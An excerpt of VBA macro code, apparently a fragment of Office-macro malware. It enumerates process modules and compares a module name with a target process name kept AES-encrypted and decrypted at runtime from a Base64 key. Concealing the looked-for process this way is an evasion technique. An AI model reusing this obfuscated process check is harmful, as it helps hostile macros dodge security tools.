...
Private Declare PtrSafe Function EnumProcessModules Lib "psapi" (ByVal hProcess As LongPtr, ByRef lphModule As LongPtr, ByVal cb As Long, ByRef lpcbNeeded As Long) As Long
Private Declare PtrSafe Function GetModuleBaseNameA Lib "psapi" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFilename As String, ByVal nSize As Long) As Long
    ...
    If hProcess <> 0 Then
        If EnumProcessModules(hProcess, hModule, Len(hModule), bytesCopied) Then
            ...
            If GetModuleBaseNameA(hProcess, hModule, moduleName, bufferSize) <> 0 Then
                ...
                If Left(moduleName, Len(moduleName) - 1) = DecryptStringAES(mycrypto.ENCRYPTED_PROCESS_NAME, SHA256(Base64Decode(mycrypto.AES_KEY))) Then
